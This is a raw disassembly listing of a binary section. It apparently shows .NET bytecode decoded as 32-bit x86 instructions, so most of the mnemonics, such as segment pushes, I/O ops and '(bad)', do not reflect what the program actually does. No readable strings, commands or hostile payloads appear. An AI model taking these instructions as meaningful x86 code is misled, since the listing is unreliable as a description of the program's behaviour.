  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 7d             	es jb  0x40374f
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	8f                   	(bad)
  40372d:	23 00                	and    (%eax),%eax
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 f9 20 00       	and    $0x20f972,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 95                	jb     0x40370f
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 ab 23 00       	and    $0x23ab72,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 b5 23 00       	and    $0x23b572,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 bf 23 00       	and    $0x23bf72,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 c5                	jb     0x403792
  4037cd:	23 00                	and    (%eax),%eax
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 d9             	or     -0x27(%edx),%dh
  4037d8:	23 00                	and    (%eax),%eax
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	dd 23                	frstor (%ebx)
  4037eb:	00 70 72             	add    %dh,0x72(%eax)
  4037ee:	e7 23                	out    %eax,$0x23
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 f3             	or     -0xd(%edx),%dh
  4037f9:	23 00                	and    (%eax),%eax
  4037fb:	70 72                	jo     0x40386f
  4037fd:	ff 23                	jmp    *(%ebx)
  4037ff:	00 70 6f             	add    %dh,0x6f(%eax)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 0b 24 00       	and    $0x240b72,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 15 24 00       	and    $0x241572,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 25 24 00       	and    $0x242572,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 31             	or     0x31(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	25 24 00 70 6f       	and    $0x6f700024,%eax
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 3b             	or     0x3b(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	b5 23                	mov    $0x23,%ch
  40386e:	00 70 6f             	add    %dh,0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 47 24 00       	and    $0x244772,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 5f 24 00       	and    $0x245f72,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 71 24 00       	and    $0x247172,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 85 24 00       	and    $0x248572,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 99 24 00       	and    $0x249972,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 97                	jb     0x40388c
  4038f5:	03 00                	add    (%eax),%eax
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 a3 24 00       	and    $0x24a372,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 af             	adc    %esi,-0x51(%edx)
  40399e:	24 00                	and    $0x0,%al
  4039a0:	70 28                	jo     0x4039ca
  4039a2:	8a 00                	mov    (%eax),%al
  4039a4:	00 0a                	add    %cl,(%edx)
  4039a6:	72 b5                	jb     0x40395d
  4039a8:	24 00                	and    $0x0,%al
  4039aa:	70 28                	jo     0x4039d4
  4039ac:	68 00 00 0a 72       	push   $0x720a0000
  4039b1:	e1 24                	loope  0x4039d7
  4039b3:	00 70 73             	add    %dh,0x73(%eax)
  4039b6:	a1 00 00 0a 0a       	mov    0xa0a0000,%eax
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 1f    	or     0x1f720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 37                	jb     0x403a4d
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 3f             	add    %dh,0x3f(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 37                	jb     0x403a7e
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 97             	add    %dh,-0x69(%edx)
  403b3e:	03 00                	add    (%eax),%eax
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
